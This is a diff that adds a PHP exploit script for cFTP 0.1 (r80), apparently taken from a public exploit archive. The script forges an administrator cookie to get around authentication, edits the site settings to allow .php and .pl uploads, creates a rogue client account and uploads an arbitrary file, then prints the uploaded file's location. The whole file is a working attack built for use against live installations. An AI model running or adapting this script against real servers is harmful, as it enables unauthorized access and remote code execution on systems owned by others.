@@ -1,0 +1,132 @@
+<?php
+# Exploit Title: cFTP <= 0.1 (r80) Arbitrary File Upload
+# Date: 2011-07-29
+# Author: leviathan (vulnerability discovered by Simon Leblanc : <https://code.google.com/p/clients-oriented-ftp/issues/detail?id=78>)
+# Software Link: https://code.google.com/p/clients-oriented-ftp/downloads/list
+# Version: 0.1
+# Tested on: linux
+
+// Vulnerable URL
+$url = 'http://[url domain]/cFTP/';
+
+// The file to upload
+$filename = dirname(__FILE__).'/info.php';
+
+
+$failext = array('php', 'pl');
+$username = 'hackname'.rand(0, 999999);
+$cookies_injection = 'access=admin; userlevel=9'; // <-- the big error of this app :-)
+
+/**
+ * Call URL
+ */
+function curl_call_url($url, $cookies_injection, $inputs = null)
+{
+  $curl = curl_init();
+  
+  curl_setopt($curl, CURLOPT_URL, $url);
+  curl_setopt($curl, CURLOPT_HEADER, false);
+  curl_setopt($curl, CURLOPT_POST, true);
+  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+  curl_setopt($curl, CURLOPT_COOKIE, $cookies_injection);
+  
+  if (is_array($inputs) === true) {
+    curl_setopt($curl, CURLOPT_POSTFIELDS, $inputs);
+  }
+  
+  $response = curl_exec($curl);
+  $headers = curl_getinfo($curl);
+  $error_number   = curl_errno($curl);
+  $error_message  = curl_error($curl);
+  
+  curl_close($curl);
+  
+  return array($response, $headers, $error_number, $error_message);
+}
+
+// Add vulnerable extensions (php, pl : defined in $failext)
+list($response, $headers, $error_number, $error_message) = curl_call_url($url.'options.php', $cookies_injection);
+
+if (preg_match_all('/<input([^>]+)name="([^"]+)"([^>]+)value="([^"]+)([^>]*)>/', $response, $matches)) {
+  $input = array();
+  $count = count($matches[0]);
+  for ($i = 0; $i < $count; $i++) {
+    $input[$matches[2][$i]] = $matches[4][$i];
+    if ($matches[2][$i] === 'allowed_file_types') {
+      foreach ($failext as $ext) {
+        if (strpos($matches[4][$i], $ext) === false) {
+          $input[$matches[2][$i]] .= ','.$ext;
+        }
+      }
+      $input[$matches[2][$i]] = str_replace(',', '|', $input[$matches[2][$i]]);
+    }
+  }
+  
+  // add select
+  if (preg_match('/<option selected="selected" value="([^"]+)"/', $response, $matches)) {
+    $input['timezone'] = $matches[1];
+  } else {
+    $input['timezone'] = 'America/Argentina/Buenos_Aires';
+  }
+  
+  // Validate the form to add the vulnerables extensions
+  list($response, $headers, $error_number, $error_message) = curl_call_url($url.'options.php', $cookies_injection, $input);
+  
+  if (strpos($response, 'message_ok') !== false) {
+    // Add new client : required to upload the file
+    $input = array(
+      'add_client_form_name' => $username,
+      'add_client_form_user' => $username,
+      'add_client_form_pass' => 'hackname',
+      'add_client_form_pass2' => 'hackname',
+      'add_client_form_address' => 'my address',
+      'add_client_form_phone' => '000-000-000',
+      //'add_client_form_notify' => '0',
+      'add_client_form_email' => $username.'@example.com',
+      'add_client_form_intcont' => '',
+      'Submit' => 'Create account',
+    );
+    
+    list($response, $headers, $error_number, $error_message) = curl_call_url($url.'clientform.php', $cookies_injection, $input);
+    
+    if (strpos($response, 'message_ok') !== false) {
+      // Now upload file :-)
+      $input = array(
+        'name' => 'my_hack_file',
+        'description' => 'It\'s my hack file',
+        'clientname' => $username,
+        'ufile' => '@'.$filename,
+        'Submit' => 'Upload',
+      );
+      
+      list($response, $headers, $error_number, $error_message) = curl_call_url($url.'fileupload.php', $cookies_injection, $input);
+      
+      if (preg_match('#<a href="([^"]+)">File uploaded correctly#', $response, $matches)) {
+        // get filename
+        list($response, $headers, $error_number, $error_message) = curl_call_url($url.$matches[1], $cookies_injection);
+        
+        if (preg_match('#<a href="([^"]+)'.basename($filename).'" target="_blank"#', $response, $matches_end)) {
+          echo 'Your file is here : '.$url.$matches[1].$matches_end[1].basename($filename);
+        } else {
+          var_dump($response);
+          echo 'fail to hack : where is the file !!!';
+        }
+      } else {
+        var_dump($response);
+        echo 'fail to hack : file not uploaded';
+      }
+    } else {
+      var_dump($response);
+      echo 'fail to hack : client not created';
+    }
+    
+  } else {
+    var_dump($response);
+    echo 'fail to hack : options not changed';
+  }
+  
+} else {
+  var_dump($response);
+  echo 'fail to hack : no input';
+}
